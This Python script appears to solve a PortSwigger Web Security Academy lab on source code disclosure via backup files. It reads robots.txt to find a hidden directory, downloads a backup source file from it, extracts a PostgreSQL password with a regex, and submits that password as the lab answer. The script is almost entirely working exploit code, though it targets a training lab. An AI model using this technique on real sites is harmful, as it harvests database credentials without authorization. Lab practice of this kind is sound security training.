#################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 3/9/2023
#
# Lab: Source code disclosure via backup files
#
# Steps: 1. Fetch /robots.txt file
#        2. List the hidden directory
#        3. Fetch the hidden backup file
#        4. Extract the key
#        5. Submit the solution
#
#################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
url = "https://0ac800ba0379fdf1835ec3b9005900b4.web-security-academy.net"

try:
    # fetch /robots.txt file
    robots = requests.get(f"{url}/robots.txt")  

except:
    print(Fore.RED + "[!] Failed to fetch /robots.txt through exception")
    exit(1)
 

print(Fore.WHITE + "1. Fetching the robots.txt file.. " + Fore.GREEN + "OK")

# extract the hidded name
hidden_name = re.findall("Disallow: (.*)", robots.text)[0]  

print(Fore.WHITE + "2. Searching for hidden files.. " +
        Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + hidden_name)

try:  
    # list the hidden directory
    hidden_dir = requests.get(f"{url}{hidden_name}")

except:
    print(Fore.RED + "[!] Failed to list the hidden directory through exception")
    exit(1)


print(Fore.WHITE + "3. Fetching the backup directory.. " + Fore.GREEN + "OK")

# extract the path the the backup file
backup_path = re.findall("href='(.*)'>", hidden_dir.text)[0]  

print(Fore.WHITE + "4. Extracting the path to the backup file.. " +
        Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + backup_path)

try:  
    # fetch the backup file
    backup_file = requests.get(f"{url}{backup_path}")

except:
    print(Fore.RED + "[!] Failed to fetch the backup file through exception")
    exit(1)


print(Fore.WHITE + "5. Fetching the backup file " + Fore.GREEN + "OK")

# extract the key
key = re.findall(r"\"postgres\",\s*\"postgres\",\s*\"(.*)\"", backup_file.text)[0]  

print(Fore.WHITE + "6. Extracting key.. " + Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + key)

# data to send via POST
data = {
    "answer": key
}

try:  
    # submit the solution
    submit_answer = requests.post(f"{url}/submitsolution", data)  

except:
    print(Fore.RED + "[!] Failed to submit the solution through exception")
    exit(1)

print(Fore.WHITE + "7. Submitting the solution.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")
